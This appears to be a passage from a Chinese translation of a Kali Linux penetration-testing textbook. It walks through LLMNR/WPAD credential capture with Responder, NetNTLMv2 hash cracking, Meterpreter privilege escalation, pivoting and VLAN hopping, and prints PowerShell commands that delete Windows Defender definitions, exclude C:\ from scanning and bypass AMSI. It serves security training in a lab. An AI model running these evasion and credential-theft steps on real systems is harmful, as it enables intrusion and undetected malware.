我们可以看到可分配给客户端的 IP 地址（`10.10.10.101`），默认网关（`10.10.10.16`），客户端的 MAC 地址，DHCP 消息的类型（`Offer`），DHCP 服务器的 IP 地址（`10.10.10.16`），子网掩码和 DNS 服务器配置。

**DHCP 请求**从客户端发送到 DHCP 服务器（恶意）以确认从**DHCP 提供**消息中接收到的 IP 配置。最后，DHCP 服务器（恶意）发送一个**DHCP ACK**数据包以确认客户端将使用提供的信息。

现在，您已经掌握了使用 Metasploit 对目标网络发动 DHCP 攻击的技能。在下一节中，我们将介绍**链路本地多播名称解析**（**LLMNR**）和 NetBIOS 攻击。

# 利用 LLMNR 和 NetBIOS-NS

在许多组织中，作为渗透测试人员，您将遇到许多充当**域控制器**（**DC**）角色的 Windows Server 机器。DC 只是运行 Active Directory 域服务的 Windows 服务器机器，用于管理组织内的所有设备。**Active Directory**（**AD**）被 IT 专业人员用来管理网络上的计算机和用户等组件。此外，IT 专业人员可以在 AD 中使用**组策略对象**（**GPOs**）来为最终设备和用户分配权限，从而创建限制以防止网络上的未经授权活动和行为。

在 Windows 环境中，**NetBIOS-NS**和**LLMNR**协议都存在。**NetBIOS-NS**代表**网络基本输入/输出系统名称服务**。NetBIOS-NS 通常用于解析本地网络上的主机名。NetBIOS 已经存在了很长时间，已经过时。但是，它仍然被用于与旧的遗留系统进行通信。

今天，LLMNR 协议通常用于没有或不可用**域名服务器**（**DNS**）服务器的网络上。与 NetBIOS-NS 类似，LLMNR 也用于解析网络上的主机名。

使用 Kali Linux，我们可以利用这些协议中的安全漏洞。在这种情况下，我们将尝试对我们的实验网络执行 MITM 攻击。此设计包含以下内容：

+   具有 Active Directory 域服务的 Windows Server 2016

+   名为`pentestlab.local`的新域

+   Windows 10 机器作为域中的客户端

+   使用 Responder 的 Kali Linux 作为攻击者机器执行 LLMNR 毒化

在这个练习中，我们将使用以下拓扑来执行我们的攻击：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/89dfe802-ef5b-44d4-a28e-f90baeef1b0e.png)

确保您在实验室中安装了 Windows Server 2016。如果还没有这样做，请阅读第三章，*设置 Kali - 第 2 部分*，其中包含安装 Windows 作为虚拟机的指南。

要在 Windows Server 2016 中设置 Active Directory，请使用以下网址：[`blogs.technet.microsoft.com/canitpro/2017/02/22/step-by-step-setting-up-active-directory-in-windows-server-2016/`](https://blogs.technet.microsoft.com/canitpro/2017/02/22/step-by-step-setting-up-active-directory-in-windows-server-2016/)。

要使用 Windows 10 机器加入`pentestlab.local`域，请参考以下网址获取说明：[`helpdeskgeek.com/how-to/windows-join-domain/`](https://helpdeskgeek.com/how-to/windows-join-domain/)。此外，在您的 Windows 10 机器上，您需要将 DNS 服务器设置为 Windows Server 2016 机器的 IP 地址，然后再加入域。

实验准备好后，让我们转到我们的 Kali Linux 机器。我们将使用 Responder 执行我们的 MITM 攻击，以捕获各种协议消息。

要开始利用 LLMNR 和 NetBIOS，请遵循以下说明：

1.  使用`locate`实用程序，我们将发现`Responder.py`的位置，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/18b21eb6-8af4-40df-a889-3df4ad239942.png)

1.  将当前工作目录更改为`/usr/share/responder`。接下来，启用 Responder 以监听网络上的流量，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/3fd8e538-a762-4930-a514-ed9102bea5f8.png)

我们将在 Responder 中使用以下参数：

+   +   **`-I`**，指定监听接口

+   `-r`，以启用网络上 NetBIOS 查询的响应

+   `-d`，以启用网络上域后缀查询的 NetBIOS 回复

+   `-w`，以启用 WPAD 恶意代理服务器

1.  默认情况下，Responder 对受害者执行中毒攻击。每当客户端尝试访问网络上的资源，例如文件共享时，用户的凭据就会通过网络发送，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/084c7f4f-9e5e-4b9e-a6b0-d1c7e333ca0a.png)

我们能够确定以下内容：

+   +   客户端的 IP 地址

+   域名

+   受害者的用户名（鲍勃）

+   受害者的密码，以 NTLMv2 哈希的形式

+   哈希算法

+   用户试图访问网络上的**服务器消息块**（**SMB**）文件共享

复制哈希并将其保存到桌面上的文本文件中。我已经将我的哈希保存在名为`Hash.txt`的文件中。

默认情况下，Responder 使用受害者的 IP 地址作为文本文件命名约定的一部分，将哈希保存在`/usr/share/responder/logs`目录中。

1.  接下来，我们可以使用**Hashcat**对 NTLMv2 哈希进行离线密码破解，以恢复用户的明文密码。使用以下语法使用 Hashcat 进行密码破解：

```
hashcat -m 5600 Hash.txt <wordlist file> --force
```

请记住，进行密码破解可能是一项耗时的任务。此外，请确保单词列表/目录文件包含大量条目，以增加成功的可能性。

使用`-m`参数来指定 Hashcat 中的模式。模式用于告诉 Hashcat 哈希的类型。模式`5600`用于**网络协议 - NetNTLMv2**。此外，要发现其他模式，请使用`hashcat --help`命令。

要下载 SecLists 单词列表，请参考以下 URL：[`github.com/danielmiessler/SecLists`](https://github.com/danielmiessler/SecLists)。

此外，您可以使用**John the Ripper**对使用 Responder 捕获的哈希进行密码破解。

现在您已经完成了本节，您现在可以利用 LLMNR 中的弱点。在下一节中，我们将演示如何利用 WPAD 的漏洞。

# WPAD 协议攻击

在企业网络中，系统管理员通常允许员工通过代理服务器访问互联网。代理服务器通常提高性能和安全性，并监视进出企业网络的网络流量。WPAD 是一种在客户端机器上使用的技术，通过 DHCP 发现方法来发现配置文件的 URL。一旦客户端机器发现文件，它就会下载到客户端机器上并执行。脚本将为客户端确定代理。

在这个练习中，我们将在 Kali Linux 上使用 Responder 来捕获受害者的用户凭据。在开始之前，本练习将使用以下拓扑结构：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/a7842e6c-9ab1-4437-bf96-745ea27cd2cd.png)

使用以下步骤，我们将能够轻松地在 Windows 环境中利用 WPAD：

实验室配置与上一节相同。

1.  确保 Windows 10 客户端机器已加入由 Windows Server 托管的域。

1.  在您的 Kali Linux 机器上，使用`cd /usr/share/responder`命令将工作目录更改为 Responder 位置。

1.  执行`python Responder.py -I eth0 -wFb`命令：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/b44e207a-13fe-43ed-8d1d-674f21064db2.png)

片段中使用的开关提供以下功能：

+   +   `-I`：指定要使用的接口

+   `-w`：启用 WPAD 恶意代理服务器

+   `-F`：强制在`wpad.dat`文件检索中使用 NTLM 身份验证

+   `-b`：用于返回基本的 HTTP 身份验证

1.  当受害者尝试浏览或访问网络上的任何本地资源时，将出现以下登录窗口：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/788a6864-c93e-496e-a35b-f05218461830.png)

1.  一旦受害者输入他们的用户凭据，Responder 将以明文显示它们，如下截图所示。

请注意，此示例中使用的用户帐户是我在个人实验室域中为教育目的设置的。

只是作为提醒，Responder 生成的所有日志和捕获的数据都存储在`/usr/share/responder/logs`目录中。现在，您可以通过利用企业网络上的 WPAD 来捕获员工的用户凭据：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/4e5797d4-710b-409e-a820-d5f78a2af58b.png)

在下一节中，我们将学习关于 Wireshark 的知识。

# Wireshark

Wireshark 是业内最好的网络协议分析器和嗅探器之一。它的功能非常广泛，并且能够对网络数据包进行深入的结果和分析。对于网络上发生的每一次对话或交易，Wireshark 都能够提供每个数据包的构成细节。

我们将首先概述 Wireshark 的功能。

# Wireshark 的基本概述以及如何在 MITM 攻击中使用它

Wireshark 已经预先安装在您的 Kali Linux 操作系统上。要开始，请执行以下步骤：

1.  导航到应用程序| 09-嗅探和欺骗| wireshark。

1.  一旦打开 Wireshark，您将看到用户界面，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/bf37db63-389b-4968-a742-e798e2d554c6.png)

1.  Wireshark 将提供所有网络接口的列表，并显示通过每个网络适配器传递的实时网络流量的摘要图。双击接口将立即在网络接口卡上开始实时捕获。

在本地系统上启用捕获将只显示流经攻击者机器和网络其余部分之间的流量。这意味着 Wireshark 只能拦截/嗅探流入和流出您计算机的网络流量。这并不那么方便，对吧？

让我们看看如何从网络交换机创建所有网络流量的镜像并将其发送到我们的攻击者机器。

# 配置 SPAN 端口

SPAN 允许交换机复制一个或多个端口上的流量，并将相同的副本发送到另一个端口。通常在网络安全管理员想要连接协议分析仪（嗅探器）或入侵检测系统（IDS）到网络以监视任何安全威胁时进行此配置：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/fa41550a-4b36-4874-9498-b9b44f314703.png)

在图中，攻击者机器（运行 Wireshark）连接到**Cisco IOS 2960** **交换机**上的 Fast Ethernet 0/1 接口，而其他设备连接到同一网络段。假设我们想要复制流经 Fast Ethernet 0/2、Fast Ethernet 0/3 和 Fast Ethernet 0/4 端口之间的所有流量。

要执行在 Cisco IOS 交换机上配置 SPAN 端口的任务，请使用以下准则：

1.  我们可以使用以下命令将输出发送到 Fast Ethernet 0/1：

```
Switch (config)# monitor session 1 source interface fastethernet 0/2 Switch (config)# monitor session 1 source interface fastethernet 0/3 Switch (config)# monitor session 1 source interface fastethernet 0/4 Switch (config)# monitor session 1 destination interface fastethernet 0/1
```

1.  验证配置，请在交换机上使用`show monitor`命令：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/0e46e174-9a7e-4fa6-a115-bbfa2d2e2bc5.png)

输出显示我们的源端口（用于监视网络流量）和目标端口已正确配置。一旦我们在攻击者机器上启用 Wireshark 开始在我们的本地接口`eth0`上捕获，所有网络数据包将实时显示在 Wireshark 用户界面上。

完成了这一部分，您现在可以在 Cisco IOS 交换机上配置 SPAN 端口。在下一节中，我们将深入了解如何配置 Wireshark 来嗅探网络流量。

# 在 Wireshark 上配置监视（嗅探）接口

要在 Wireshark 上配置监视（嗅探）接口，请遵循以下说明：

1.  单击“捕获”|“选项”以显示本地机器上的所有网络接口：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/ae0917ee-9347-47b0-b226-c9e6a4761ed7.png)

1.  选择适当的网络接口，选择在所有接口上启用混杂模式，然后单击“开始”开始捕获网络数据包：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/c630fee5-a4f6-46f4-bc06-4bf2c8b4be03.png)

1.  **数据包列表**窗格将开始填充网络数据包，因为网络上正在进行交易。单击数据包将在以下**数据包详细信息**窗格中显示其所有详细信息和字段：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/af5558ed-bc66-4b5f-8e1c-a5d2c73511f5.png)

当界面上的数据包被填充时，体验可能有点压倒性。在接下来的子部分中，我们将采取实际方法进行 HTTP 分析和其他类型的分析，以确定一些重要信息。

完成了本节，您现在可以将 Wireshark 用作网络上的嗅探器。在下一节中，我们将演示如何执行流量分析以收集敏感信息。

# 解析 Wireshark 数据包捕获以找到有用信息

在接下来的练习中，我们将使用**The Honeynet Project**（[www.honeynet.org](http://www.honeynet.org)）的捕获来帮助我们理解数据包分析。要执行 Wireshark 数据包的解析，请遵循以下步骤：

1.  转到[`www.honeynet.org/node/1220`](https://www.honeynet.org/node/1220)并下载`conference.pcapng`文件。此外，以下 URL，[`honeynet.org/sites/default/files/conference.pcapng.gz`](https://honeynet.org/sites/default/files/conference.pcapng.gz)，是该文件的直接下载链接。

1.  下载后，使用 Wireshark 打开`conference.pcapng`文件；您应该看到以下视图：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/afc0e862-89c0-4de9-859a-0f7a923a6cdf.png)

1.  Wireshark 的一个有用功能是通过 DNS 自动将 IP 地址解析为主机名，将 MAC 地址解析为供应商名称，并将端口号解析为服务和协议。要启用此功能，请转到编辑 | 首选项 | 名称解析。确保已选中以下选项：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/4e42f6ef-95f8-4c75-8a10-5788899c8227.png)

1.  点击“确定”以确认并保存配置。回到主用户界面，您会注意到所有公共 IP 地址现在都已解析为它们的公共主机名：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/4ae894dd-0d03-477b-a3ec-e28b7b069912.png)

1.  Wireshark 之所以成为强大的工具，是因为它的显示和捕获过滤器。要查看所有源自源 IP 地址的流量，请使用`ip.src == <ip 地址>`过滤器：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/d049a841-2892-4e6d-a706-532e5849ee78.png)

要显示特定目标地址的所有流量，我们可以使用`ip.dst == <ip 地址>`过滤器。但是，我们可以结合过滤器使用`(ip.src == <ip 地址>) && (ip.dst == <ip 地址>)`过滤器查看从特定源到目的地的流量。在以下截图中，我们使用过滤器查看所有源自`172.16.254.128`并前往 Google 的 DNS 服务器`8.8.8.8`的流量：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/42722bca-24e6-4c64-b77d-7244da1f3719.png)

在组合过滤器时，您需要使用逻辑操作来完成任务。以下是 Wireshark 中用于组合过滤器的各种运算符的简短列表：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/b64167ac-358e-4638-a06e-1b9f6d51add7.png)

`Ge`运算符用于指示**大于或等于**，而`Le`运算符用于指示**小于或等于**。

要了解更多关于 Wireshark 显示过滤器的信息，请访问[`wiki.wireshark.org/DisplayFilters`](https://wiki.wireshark.org/DisplayFilters)。

对于任何人来说，记住显示过滤器可能非常具有挑战性。但是，Wireshark 已经简化了使用用户界面上的右键单击选项轻松创建自定义过滤器。现在让我们尝试一些练习，以帮助您更熟悉显示过滤器。

要开始在 Wireshark 中创建显示过滤器，请执行以下步骤：

1.  首先，在数据包 1 上右键单击源 IP 地址，然后单击**应用为过滤器** | **已选择**，立即创建并应用过滤器：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/aca92aa8-80a7-44f5-a214-503e926d9a38.png)

现在，我们有一个显示所有源自`172.16.254.128`地址的流量的过滤器。

1.  接下来，在目标列中，右键单击`8.8.8.8`或`google-public-dns-a.google.com`，单击**应用为过滤器**，然后选择选项**...和已选择的**：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/de821ab1-ad5b-48a9-8973-7ad5140adf2c.png)

这将导致仅显示源自`172.16.254.128`并发送到 Google 的 DNS 服务器的流量。

**应用为过滤器**选项将立即在 Wireshark 上应用显示过滤器。但是，**准备为过滤器**提供相同的选项，但不会立即应用显示过滤器。相反，它允许您继续构建过滤器语法，并在之后应用它。

1.  要查看网络上设备之间的所有对话，请单击**统计** | **对话**：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/f5f37362-8c54-4227-b8cc-52f135858a86.png)

对话窗口将打开，提供多个选项卡，其中包含以太网，IPv4，IPv6，TCP 和 UDP 会话的各种详细信息，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/f3fa99eb-394f-490f-b7df-601a994c1d5a.png)

您将能够确定在给定时间内进行通信和传输数据包的设备。

1.  Wireshark 允许我们轻松查看通过网络下载和上传的所有文件。要执行此任务，请单击**文件** | **导出对象** | **HTTP**。 HTTP 导出窗口将打开，显示数据包，主机名（源），内容类型，大小和文件名等详细信息。要将文件导出到桌面，请在界面上选择一个数据包，然后单击**保存**：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/1f9df10d-b5f2-468b-b303-a369581efa68.png)

要从 Wireshark 捕获中导出所有文件，请使用**保存所有**选项。

1.  要重新组装并查看两个设备之间的单个对话的所有消息，请右键单击数据包，然后选择**跟踪** | **TCP 流**：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/f139b3f2-a670-447d-a029-63b2d1ffc4de.png)

Wireshark 将收集此流的所有数据包，重新组装它们，并向您呈现两个设备之间交换的消息对话框，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/8528ead3-f63d-49c0-a07a-c3dd59a9c2c0.png)

以下是客户端和 Linux 服务器之间 Telnet 对话的屏幕截图。 Telnet 是一种**不安全**协议，Telnet 客户端和 Telnet 服务器之间的所有通信都以明文形式通过网络发送。以下屏幕截图显示了 Wireshark 如何重新组装单个对话的所有数据包：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/1ea8187a-0a9f-41ca-9d22-ea443dbc9219.png)

我们可以看到用于登录服务器的用户凭据，服务器的**当天消息**（**MOTD**）横幅以及所有其他交易。

完成了本节，您现在具备了在 Wireshark 中创建自定义显示过滤器所需的技能。在下一节中，我们将学习如何升级权限。

# 升级权限

获取用户凭据以访问系统只是渗透测试中获得访问权限阶段的一部分。但是，请记住，并非所有用户帐户都具有**root**或**管理员**权限。因此，远程访问具有非根或标准用户帐户的系统将阻止您执行某些应用程序并在受害者系统上执行管理任务。

可以使用各种技术来升级权限，包括以下内容：

+   从 Windows 的 SAM 文件中获取信息

+   从 Linux 上的`passwd`文件中检索数据

+   利用系统上运行进程的弱权限

+   获取存储在网络文件共享上的敏感信息

+   在用户与网络上的另一设备通信时，捕获用户密码的哈希值。

SAM 和 passwd 文件中的信息包含用户的用户名和密码的哈希值。使用密码破解技术，您将能够检索用户帐户的明文密码，然后可以使用这些密码访问设备。获取管理员或 root 帐户将为您提供对系统的无限制访问。

拥有标准用户帐户的系统访问权限意味着我们可以执行本地特权升级漏洞利用来获取管理员或根级别的访问权限。

Exploit-DB ([`www.exploit-db.com/`](https://www.exploit-db.com/))提供了一个用于多种目的的大型漏洞利用库；使用 Exploit-DB 网站上的搜索功能来发现特权升级漏洞利用：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/3e89a7d7-35cc-48b9-8cb6-18ab63449897.png)

在之前的章节中，我们演示了使用 Metasploit 成功利用目标并获取访问权限的技术。**Meterpreter**组件提供了`getsystem`命令，它尝试在目标系统上提升权限，如下面的截图所示。仔细看：你会看到我们能够在受害机上获得`nt authority\system`权限。这是最高级别的访问权限：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/4632f435-c683-478d-bf6e-9e5507cc0676.png)

在我们的 Meterpreter shell 中，我们可以使用`shell`命令来获取受害机器的 Windows 命令提示符，以验证我们在受害机器上的权限级别。

始终确保通过检查 Exploit-DB ([www.exploit-db.com](http://www.exploit-db.com))和通用漏洞和暴露 ([`cve.mitre.org/`](https://cve.mitre.org/)) 数据库来进行关于目标漏洞的广泛研究，以帮助你获取访问权限和提升用户权限的漏洞利用。在下一节中，我们将深入研究横向移动。

# 横向移动策略

横向移动允许攻击者将所有攻击通过一个受损的机器转移到组织内的其他子网。让我们想象一下，你正在对客户的网络进行渗透测试。他们的组织包含多个子网，但他们没有告诉你实际存在的网络数量。所以，你开始扫描网络以寻找活动主机和漏洞，并发现拓扑结构。

你已经发现并映射了整个`10.10.10.0/24`网络，并开始尽可能多地利用机器。然而，在你的利用阶段，你注意到了一个特定受害机器上的有趣的东西，并且在 Meterpreter shell 上，你执行`ipconfig`命令来查看受害机器上的 IP 配置：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/e442c01d-4d50-4445-b5f5-916ca37ee78e.png)

在我们的情景中，`Interface 11`连接到与攻击者机器相同的子网，而`Interface 18`连接到另一个网络。在某些情况下，如果你尝试访问另一个子网，路由器或防火墙可能会配置为出于安全目的限制不同子网之间的访问。

为了绕过安全设备和网络访问控制，应该使用**横向移动**（枢轴）技术。作为攻击者，我们可以尝试妥协连接并在组织内其他子网上受信任的机器。一旦我们建立了枢轴或横向移动，所有我们的攻击将被发送通过受害机器并转发到新的目标网络，如下面的截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/ac8f85bd-b20b-4685-9251-0c8f59b45560.png)

要使用 Metasploit 执行横向移动，请遵循以下说明：

1.  在 Meterpreter 上使用`arp`命令将显示 ARP 缓存。在下面的截图中，有两个不同的网络连接到我们的受害机：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/c1785c20-b25d-4969-b5a2-1e98fd89d4a9.png)

1.  要启用横向移动，在 Meterpreter 中执行`run post/multi/manage/autoroute`命令，如下面的截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/0098d4f9-d6fb-491d-99f5-c1622d05ffb2.png)

这将添加一个路由到附加网络，并允许你的攻击者机器将所有攻击发送到受害机器（`10.10.10.23`）并转发到`10.10.11.0/24`网络。

1.  为了测试横向移动（枢纽），我们可以尝试从攻击者机器上对`10.10.11.0/24`网络执行 NetBIOS 扫描：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/cb1ddc8e-9afa-4c48-9bc9-b926fcb80922.png)

以下结果证明我们的攻击者机器能够对另一个子网执行扫描和攻击：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/b6b72db3-be18-457f-b3a5-d656cb91d5c3.png)

1.  此外，在目标上执行 TCP 端口扫描已经证明是成功的，因为所有攻击都是通过`10.10.10.23`机器发送的：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/dfeeee96-449b-4629-941b-6b24def7a7af.png)

然后我们可以针对新的子网。

在渗透测试期间，我们可能被要求发现隐藏或远程网络。对于您已经访问的每个系统，请务必检查受害者机器上的 ARP 缓存，并尝试在整个网络中执行横向移动。

在下一节中，我们将介绍如何使用 PowerShell 禁用 Windows Defender。

# PowerShell 技巧

PowerShell 是建立在.NET 上的命令行脚本语言。IT 专业人员可以使用 PowerShell 自动化许多任务并更好地管理他们的操作系统。Windows、Linux 和 macOS 都支持 PowerShell。

在下一节中，我们将深入学习如何使用 PowerShell 删除 Windows Defender 病毒定义。

# 删除 Windows Defender 病毒定义

在所有现代版本的 Microsoft Windows 中，Microsoft 都将**Windows Defender**作为本机防恶意软件保护。有许多家庭用户和组织在终端设备上使用 Windows Defender 作为首选的防恶意软件解决方案。作为渗透测试人员，在渗透测试期间不被检测到非常重要，因为您的行动旨在模拟真实世界的攻击。

以下 PowerShell 脚本将从 Windows Defender 中删除所有病毒定义：

```
"c:\program files\windows defender\mpcmdrun.exe" -RemoveDefinitions -All Set-MpPreference -DisablelOAVProtection $true
```

以下屏幕截图显示了在 Windows 10 机器上成功执行前述脚本的输出：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/8780f8af-a73f-474d-a22b-9a1c6201315c.png)

此外，查看 Windows Defender 版本信息；我们可以看到所有定义都已被删除：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/4bb8d48c-d2aa-4803-901b-79519a0f6571.png)

可能会有 Windows Defender 重新启用的情况。使用以下脚本将`C:\`路径添加到 Windows Defender 排除列表中：

```
powershell Add-MpPreference -ExclusionPath "c:\"
```

以下屏幕截图演示了如何成功执行脚本：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/313b6e31-26d8-4c91-9608-7edaa7c392e9.png)

这种技术将允许我们在受害者的 Windows 机器的`C:`驱动器上执行恶意代码。

现在您已经学会了如何从 Windows Defender 中删除病毒定义，我们现在将介绍如何禁用 Windows **防恶意软件扫描接口**（**AMSI**）。

# 禁用 Windows 防恶意软件扫描接口

Microsoft 在最近的 Windows 版本中包含了其 AMSI，以防止在本地系统上执行任何恶意代码。如果您正在破坏 Windows 操作系统，执行 PowerShell 脚本可能非常有帮助，但 AMSI 将阻止任何恶意行为。要禁用 AMSI，请执行以下 PowerShell 脚本：

```
"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsilnitFailed','NonPublic,Static').SetValue($null,$true)"
```

以下屏幕截图显示了在 Windows 10 操作系统上成功执行脚本：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/8a51a46a-4c8b-4c4b-bf92-9fa263c44631.png)

此时，您可以在受害者的 Windows 机器上运行几乎任何恶意代码。

本节假定您已经破坏了企业网络上的 Windows 操作系统。在下一节中，我们将简要讨论 IT 行业中许多网络管理员忽视的常见漏洞：VLAN 跳跃。

# 启动 VLAN 跳跃攻击

组织通常实施**虚拟局域网**（**VLANs**）来分割和改善其网络基础设施的性能，同时提高安全性。在配置 VLAN 时，我们关注的是两个主要端口：访问端口和干线端口。

访问端口是配置为将终端设备连接到交换机的端口。这些端口只允许一个数据 VLAN 和一个额外的语音 VLAN。在配置访问端口时，VLAN ID 通常被静态配置为交换机上的访问端口。

要使多个 VLAN 在网络上通信，需要在交换机之间配置干线端口。干线端口允许多个 VLAN 同时传输流量。干线端口在交换机之间配置，并在交换机和路由器之间配置，以实现 VLAN 间路由，允许一个 VLAN 与另一个 VLAN 通信。

许多时候，IT 专业人员没有正确配置网络设备。渗透测试人员可以利用这个漏洞，并尝试执行 VLAN 跳跃攻击。一旦成功，攻击者的机器将能够访问所有可用的 VLAN，并执行 MITM 攻击。以下图表显示了一个成功启用未经授权的干线的攻击者：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/fbe4f6dd-78bb-4cb1-978a-74e14f34abeb.png)

在 Kali Linux 上，**Yersinia**允许攻击者对网络执行各种类型的第二层攻击，以利用安全配置错误和弱点。要打开 yersinia，请执行以下命令：

```
yersinia -G
```

图形用户界面将出现在您的桌面上。要启动 VLAN 跳跃攻击，请执行以下步骤：

1.  点击**启动攻击**按钮。

1.  将会出现一个新窗口。点击**DTP**选项卡，并选择**启用干线**单选按钮，如下图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/28339c2b-c036-43f3-9bae-769d61fad6f8.png)

1.  当您准备好时，点击确定开始在网络上执行**VLAN 跳跃**攻击。

完成本节后，您现在能够使用 Kali Linux 执行 VLAN 跳跃攻击。

# 总结

在本章的过程中，您已经学习了内部网络扫描、MITM 攻击、数据包分析、权限提升、使用 Meterpreter 进行横向移动、使用 PowerShell 禁用 Windows Defender 以及 VLAN 跳跃等技能。

现在您已经掌握了使用 AutoScan-Network、Zenmap 和 Netdiscover 等工具进行内部网络扫描的技能。此外，您现在能够使用 Wireshark 捕获数据包并进行数据包分析，以查看受害者的流量如何在目标网络中流动。此外，您知道如何成功执行连接后攻击，如横向移动（枢纽），以及如何使用 PowerShell 禁用受害者系统上的 Windows Defender 病毒防护。

我希望本章对您的学习和职业有所帮助和启发。在第十二章中，*网络渗透测试-检测和安全*，您将学习如何检测 ARP 欺骗攻击和可疑活动，并了解一些补救技术。

# 问题

以下是基于本章内容的一些问题：

1.  可以使用什么工具访问错误配置的交换机上的多个 VLAN？

1.  Meterpreter 中可以使用哪个命令来提升权限？

1.  ARP 的目的是什么？

1.  由于 Telnet 是一种不安全的协议，在传输数据时应使用哪种其他远程访问协议以防止攻击者看到数据？

1.  在 Windows 操作系统中，如何确定当前用户权限和用户帐户的名称？

# 进一步阅读

+   **横向移动技术**：[`attack.mitre.org/tactics/TA0008/`](https://attack.mitre.org/tactics/TA0008/)

+   **Wireshark 文档**：[`www.wireshark.org/docs/`](https://www.wireshark.org/docs/)


# 第十二章：网络渗透测试-检测和安全

作为渗透测试人员，理解网络安全的概念本身就是一种资产。在本章中，我们将专注于网络安全运营方面的内容。了解如何检测威胁和可疑的网络流量模式是重要的，因为这将帮助 IT 安全团队检测和阻止网络上的攻击。您将学习各种**蓝队策略**，用于检测和防止组织网络基础设施内的网络攻击。在向客户提交渗透测试报告后，客户可能要求提供额外的服务，以帮助他们检测和防止组织内的网络威胁。本章将帮助您开始使用可疑流量监控和预防技术。

在本章中，我们将涵盖以下主题：

+   使用 Wireshark 理解 ARP

+   检测 ARP 欺骗攻击

+   检测可疑活动

+   **中间人攻击**（**MITM**）的补救技术

+   嗅探补救技术

# 技术要求

本章的技术要求如下：

+   Kali Linux: [`www.kali.org/`](https://www.kali.org/)

+   Wireshark Telnet 文件：[`wiki.wireshark.org/SampleCaptures#Telnet`](https://wiki.wireshark.org/SampleCaptures#Telnet)

# 使用 Wireshark 理解 ARP

**地址解析协议**（**ARP**）旨在将 IP 地址解析为 MAC 地址。ARP 的重要性有时被 IT 专业人员低估。在**局域网**（**LAN**）或同一子网内的设备之间的所有通信都使用**媒体访问控制**（**MAC**）地址。这意味着设备在通信时不使用 IP 地址，除非通信超出了它们的本地子网，比如到另一个网络（或子网）。

让我们用一个简单的类比来解释，一个 PC 想要将文件发送到网络打印机进行打印。如果这两个设备在同一个子网上，PC 将把它的消息（文件）封装在一个帧内，并发送到网络交换机。网络交换机将读取帧的目标 MAC 地址，并将其转发到网络打印机进行处理。

让我们看一下以下截图。这是 Wireshark 捕获的一帧。通过观察第 2 层协议，即 ARP，我们可以确定一些事情：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/2e6b0d27-3738-4542-9c7c-de2f22d005c6.png)

